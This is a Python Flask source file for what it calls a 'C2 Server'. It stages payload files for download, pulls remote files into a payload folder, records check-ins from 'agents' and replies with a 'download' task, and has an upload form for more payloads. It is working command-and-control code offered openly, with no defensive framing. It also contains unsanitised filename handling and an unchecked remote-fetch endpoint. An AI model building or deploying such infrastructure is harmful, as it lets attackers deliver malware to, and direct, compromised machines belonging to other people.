from flask import Flask, request, send_from_directory, jsonify, redirect, render_template_string, send_from_directory
import os, json, requests

app = Flask(__name__)
PAYLOAD_DIR = "payloads"
os.makedirs(PAYLOAD_DIR, exist_ok=True)

@app.route("/")
def index():
    return "C2 Server is running."

@app.route("/health-check")
def health_check():
    return "C2 Server is up running."

@app.route("/payload/<filename>")
def download_payload(filename):
    return send_from_directory(PAYLOAD_DIR, filename)

@app.route("/fetch", methods=["POST"])
def fetch_file():
    url = request.json.get("url")
    fname = url.split("/")[-1]
    r = requests.get(url)
    with open(os.path.join(PAYLOAD_DIR, fname), "wb") as f:
        f.write(r.content)
    return {"status": "fetched", "file": fname}

@app.route("/checkin", methods=["POST"])
def agent_checkin():
    data = request.get_json()
    print(f"[+] Agent check-in: {data}")
    return jsonify({"status": "online", "next_task": "download"})
    
@app.route("/files")
def list_files():
    files = os.listdir(PAYLOAD_DIR)
    file_links = [
        f'<li><a href="/payload/{fname}" target="_blank">{fname}</a></li>'
        for fname in files
    ]
    html_list = f"""
    <h2>Available Payloads</h2>
    <ul>{''.join(file_links)}</ul>
    <br>
    <a href="/upload"><button>⬅ Upload More Files</button></a>
    """
    return render_template_string(html_list)

PAYLOAD_DIR = "/app/payloads"  # Adjust if your path is different
os.makedirs(PAYLOAD_DIR, exist_ok=True)

@app.route("/upload", methods=["GET", "POST"])
def upload_file():
    if request.method == "POST":
        if "files" not in request.files:
            return "No file part", 400
        files = request.files.getlist("files")
        if not files or files[0].filename == "":
            return "No selected files", 400
        for f in files:
            f.save(os.path.join(PAYLOAD_DIR, f.filename))
        return redirect("/files")

    html_form = '''
    <h2>Upload Multiple Payload Files</h2>
    <form method="POST" enctype="multipart/form-data">
        <input type="file" name="files" multiple><br><br>
        <input type="submit" value="Upload Files">
    </form>
    <br><a href="/files">➡ View Uploaded Files</a>
    '''
    return render_template_string(html_form)
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8880)
